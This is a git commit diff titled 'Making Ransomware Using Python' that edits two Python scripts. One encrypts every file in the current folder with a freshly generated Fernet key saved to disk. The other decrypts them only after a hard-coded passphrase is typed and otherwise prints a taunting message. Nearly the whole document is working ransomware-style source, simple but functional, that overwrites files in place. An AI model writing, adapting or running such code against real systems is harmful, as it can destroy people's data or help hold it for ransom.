3707e55b9c5ae0436fb29afcffdca023c1b5a257
Yash Kolhatkar <psd.yash@gmail.com>
2024-03-21 00:21:38 +0530

    Making Ransomware Using Python

--- construction.py
+++ construction.py
@@ -1,30 +1,32 @@
-import os 
+import os
 from cryptography.fernet import Fernet
 
-#first find all the files in the folder 
-
-fileslist = []
-
-for files in os.listdir():
-	if (files == "destruction.py" or files =="Key.key" or files=="construction.py"):
-		continue
-	if (os.path.isfile(files)):
-		fileslist.append(files)
-
-with open("Key.key", "rb") as key: 
-	key = key.read()
+# first find all the files in the folder
+passkey = input("Enter Your PassKey : ")
 
 
-with open("Key.key", "wb") as thekey:
-	thekey.write(key)
+if (passkey == "Yash is the Best Programmer in the World"):
+    fileslist = []
 
+    for files in os.listdir():
+        if (files == "destruction.py" or files == "Key.key" or files == "construction.py"):
+            continue
+        if (os.path.isfile(files)):
+            fileslist.append(files)
 
-for files in fileslist: 
-	with open(files, "rb") as thefile:
-		contents = thefile.read()
-	dec_contents = Fernet(key).decrypt(contents)
+    with open("Key.key", "rb") as key:
+        key = key.read()
 
-	with open(files, "wb") as thefile:
-		thefile.write(dec_contents)
+    with open("Key.key", "wb") as thekey:
+        thekey.write(key)
 
+    for files in fileslist:
+        with open(files, "rb") as thefile:
+            contents = thefile.read()
+        dec_contents = Fernet(key).decrypt(contents)
 
+        with open(files, "wb") as thefile:
+            thefile.write(dec_contents)
+
+else:
+    print("Plz Make Yash Happy to Acess The PassKey")
--- destruction.py
+++ destruction.py
@@ -1,33 +1,33 @@
-import os 
+import os
 from cryptography.fernet import Fernet
 
-#first find all the files in the folder 
+# first find all the files in the folder
+
 
 fileslist = []
 
 for files in os.listdir():
-	if (files == "destruction.py" or files == "construction.py" or files == "Key.key"):
-		continue
-	if (os.path.isfile(files)):
-		fileslist.append(files)
+    if (files == "destruction.py" or files == "construction.py" or files == "Key.key"):
+        continue
+    if (os.path.isfile(files)):
+        fileslist.append(files)
 
+# print(fileslist)
 
-#print(fileslist)
-
-#Making a key to lock 
+# Making a key to lock
 
 key = Fernet.generate_key()
 
+# Encrypt all the files in the folder
 with open("Key.key", "wb") as thekey:
-	thekey.write(key)
+    thekey.write(key)
 
-for files in fileslist: 
-	with open(files, "rb") as thefile:
-		contents = thefile.read()
-	enc_contents = Fernet(key).encrypt(contents)
+for files in fileslist:
+    with open(files, "rb") as thefile:
+        contents = thefile.read()
+    enc_contents = Fernet(key).encrypt(contents)
 
-	with open(files, "wb") as thefile: 
-		thefile.write(enc_contents)
-
+    with open(files, "wb") as thefile:
+        thefile.write(enc_contents)
 
 print("The Files Have Been Encrypted")
